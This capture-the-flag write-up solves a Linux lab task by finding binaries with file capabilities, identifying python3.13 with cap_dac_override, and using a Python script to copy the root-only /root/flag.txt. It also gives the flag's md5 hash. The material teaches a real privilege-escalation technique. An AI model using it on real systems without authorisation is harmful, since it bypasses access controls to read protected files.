## "Madrid": exploiting capabilities

### Problem

Description: You are logged in as the admin user without sudo privileges.

A secret string is in the file /root/flag.txt and you don't have permission to read it directly.

However, a standard system binary has been misconfigured with a "hidden" capability that allows it to bypass file permissions.

Your mission is to find the misconfigured binary and use it to copy the content of /root/flag.txt into the file /home/admin/flag.txt.

Root (sudo) Access: False

Test: cat /home/admin/flag.txt displays the same string that is in /root/flag.txt, with md5sum /home/admin/flag.txt returning a43d338b0fc1dfb0c6425aa55e24c8c6 (the solution string without an ending newline is also accepted)

### Solution

1. find the misconfigured binary

```python
admin@i-090536d9f87b01dfc:~$ cat find_cap.py 
#!/usr/bin/env python3
import os
import struct

dirs = ["/bin", "/usr/bin", "/usr/local/bin", "/sbin", "/usr/sbin", "/opt"]

def to_capsh_hex(b):
    # capsh prints groups of 4 little-endian 32-bit words in hex
    if len(b) % 4 != 0:
        b = b + b"\x00" * (4 - (len(b) % 4))
    words = struct.unpack("<" + "I" * (len(b) // 4), b)
    return ",".join(f"{w:08x}" for w in words)

for d in dirs:
    if not os.path.isdir(d):
        continue
    for root, _, files in os.walk(d, followlinks=False):
        for f in files:
            path = os.path.join(root, f)
            try:
                if os.path.isfile(path) and os.access(path, os.X_OK):
                    cap = os.getxattr(path, b"security.capability", follow_symlinks=False)
                    if cap:
                        print(f"CAPABLE: {path} -> {to_capsh_hex(cap)}")
            except Exception:
                pass
```

Python3.13 is the misconfigured binary.

```python
admin@i-090536d9f87b01dfc:~$ ./find_cap.py 
CAPABLE: /bin/python3.13 -> 02000001,00000002,00000000,00000000,00000000
CAPABLE: /usr/bin/python3.13 -> 02000001,00000002,00000000,00000000,00000000
```

It has `cap_dac_override` capability.

> CAP_DAC_OVERRIDE: Bypass file read, write, and execute permission checks. (DAC is an abbreviation of "discretionary access control".) https://www.man7.org/linux/man-pages/man7/capabilities.7.html

```
tim@tim-virtual-machine ~> capsh --decode=02000001,00000002,00000000,00000000,00000000
0x0000000002000001=cap_chown,cap_sys_time
tim@tim-virtual-machine ~> capsh --decode=00000002
0x0000000000000002=cap_dac_override
```

2. write a python script to directly read the content of "/root/flag.txt" and write it to  "/home/admin/flag.txt".

```python
admin@i-090536d9f87b01dfc:~$ cat hack.py 
#!/usr/bin/env python3

def copy_file(src, dst):
    # Read the source file
    with open(src, "r") as f:
        data = f.read()

    # Write to the destination file
    with open(dst, "w") as f:
        f.write(data)

copy_file("/root/flag.txt", "/home/admin/flag.txt")
```

The use of AI:

* generate scripts
* ask which tool can be used to decode the capability hex
